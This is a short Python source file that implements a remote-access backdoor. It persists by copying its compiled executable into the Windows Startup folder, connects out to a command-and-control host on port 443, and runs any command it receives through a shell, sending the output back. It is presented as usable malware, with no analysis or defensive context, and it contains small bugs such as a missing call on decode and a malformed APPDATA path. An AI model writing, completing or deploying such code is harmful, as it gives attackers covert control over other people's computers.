import socket
import os
import subprocess
import threading
import time


CCPORT = 443
CCIP = ""


def autocompile():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe")
    os.system("copy {} \"APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_file))


def connection(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        return error


def cmd(client, data):
    try:
        process = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = process.stdout.read() + process.stderr.read()
        client.send(output + b"\n")
    except Exception as error:
        return error




def target(client):
    try:
        while True:
            data = client.recv(1024).decode.strip()
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()

    except Exception as error:
        return error


if __name__ == "__main__":
    autocompile()
    while True:
        client = connection(CCIP, CCPORT)

        if client:
            target(client)
        else:
            time.sleep(3)